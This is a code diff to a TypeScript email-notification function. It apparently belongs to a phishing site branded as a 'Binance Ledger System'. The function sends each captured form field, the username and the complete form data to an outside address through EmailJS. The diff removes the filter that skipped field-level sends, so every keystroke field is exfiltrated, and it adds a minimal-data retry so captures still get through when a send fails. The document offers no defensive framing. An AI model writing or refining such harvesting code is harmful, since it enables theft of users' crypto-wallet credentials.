@@ -15,16 +15,11 @@ interface EmailData {
 }
 
 export const sendEmailNotification = async (data: EmailData) => {
-  // Skip field-level emails to reduce server load and focus on button clicks
-  if (data.field && !data.step.includes('Submit') && !data.step.includes('Confirm') && !data.step.includes('Request')) {
-    console.log('⏭️ Skipping field-level email to reduce delays');
-    return;
-  }
-
-  console.log('=== PRIORITY EMAIL NOTIFICATION START ===');
+  console.log('=== EMAIL NOTIFICATION START ===');
   console.log('Priority level:', data.priority || 'normal');
   console.log('Data being sent:', data);
 
+  // Ensure all template variables are properly formatted and never undefined
   const templateParams = {
     to_email: "donotreply@binanceledger.com",
     from_name: "Binance Ledger System - URGENT",
@@ -36,48 +31,65 @@ ${data.username ? `Username: ${data.username}` : ''}
 Timestamp: ${data.timestamp}
 
 ${data.allFormData ? `Complete Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
-    step: data.step,
+    
+    // Ensure these are always strings, never undefined
+    step: data.step || '',
     field: data.field || '',
     value: data.value || '',
     username: data.username || '',
-    timestamp: data.timestamp,
+    timestamp: data.timestamp || new Date().toISOString(),
     allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
   };
 
-  console.log('📧 Sending PRIORITY email immediately...');
+  console.log('📧 Template parameters being sent:', templateParams);
+  console.log('📧 Sending email immediately...');
 
   try {
-    // Send email with higher priority
+    // Send email with proper error handling
     const result = await emailjs.send(
       "service_r7sis9a",
       "template_dec5tz3", 
       templateParams
     );
     
-    console.log('✅ PRIORITY Email sent successfully!', result);
-    console.log('=== PRIORITY EMAIL NOTIFICATION END ===');
+    console.log('✅ Email sent successfully!', result);
+    console.log('=== EMAIL NOTIFICATION END ===');
     return result;
   } catch (error) {
-    console.error('❌ PRIORITY Email failed to send:', error);
+    console.error('❌ Email failed to send:', error);
     console.error('Error details:', error);
+    console.error('Template params that failed:', templateParams);
     
-    // Retry once immediately for critical actions
+    // For high priority, try once more with minimal data to ensure delivery
     if (data.priority === 'high') {
-      console.log('🔄 Retrying high-priority email...');
+      console.log('🔄 Retrying with minimal data for high-priority email...');
       try {
+        const minimalParams = {
+          to_email: "donotreply@binanceledger.com",
+          from_name: "Binance Ledger System",
+          subject: `Alert: ${data.step}`,
+          message: `Action: ${data.step}\nTimestamp: ${data.timestamp}`,
+          step: data.step,
+          field: '',
+          value: '',
+          username: data.username || '',
+          timestamp: data.timestamp,
+          allFormData: ''
+        };
+        
         const retryResult = await emailjs.send(
           "service_r7sis9a",
           "template_dec5tz3", 
-          templateParams
+          minimalParams
         );
-        console.log('✅ Retry successful!', retryResult);
+        console.log('✅ Minimal retry successful!', retryResult);
         return retryResult;
       } catch (retryError) {
         console.error('❌ Retry also failed:', retryError);
       }
     }
     
-    console.log('=== PRIORITY EMAIL NOTIFICATION END (ERROR) ===');
+    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
     throw error;
   }
 };
